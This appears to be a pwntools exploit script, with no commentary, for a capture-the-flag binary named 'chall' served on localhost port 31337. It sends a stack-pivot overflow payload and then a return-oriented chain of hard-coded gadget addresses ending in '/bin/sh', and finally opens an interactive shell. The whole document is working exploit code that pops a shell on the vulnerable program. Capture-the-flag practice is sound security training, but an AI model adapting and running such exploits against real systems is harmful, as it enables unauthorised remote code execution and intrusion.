#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./chall')
libc = elf.libc
context.update(
    log_level='debug',
    terminal=['/usr/bin/x-terminal-emulator','-e']
)

sla = lambda x, y: p.sendlineafter(x, y)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
s = lambda x: p.send(x)
rcall = lambda x: p.recvall(x)
rcud = lambda x: p.recvuntil(x, drop=True)
rcu = lambda x: p.recvuntil(x)
rcl = lambda: p.recvline(0)
rcn = lambda x: p.recv(x)
logi = lambda x, y: log.info(f'{x} = {hex(y)}')
libx = lambda x: libc.address + x
def bleak(x): ret = unpack(x, 'all'); logi('leak', ret); return ret
def hleak(x): ret = eval(x); logi('leak', ret); return ret

def start():
    global libc
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug([elf.path], c)
    else:
        return elf.process()

c = '''
set follow-fork-mode parent
b* 0x0000000000401193
c
'''

REMOTE = 'localhost 31337'.replace('nc ', '').split(' ')
HOST = REMOTE[0] if REMOTE else ''
PORT = int(REMOTE[1]) if len(REMOTE) > 1 else 0

p = start()

pl = flat({
    0x100 : [
        0x404040+0x100,
        0x401174,
    ]
})
sla(b'LKS!\n', pl)

sl(b'/bin/sh\x00'+p64(0)*32+p64(0x0040119c)*0xd6+p64(0x4011a0)+p64(0x401156))

p.interactive()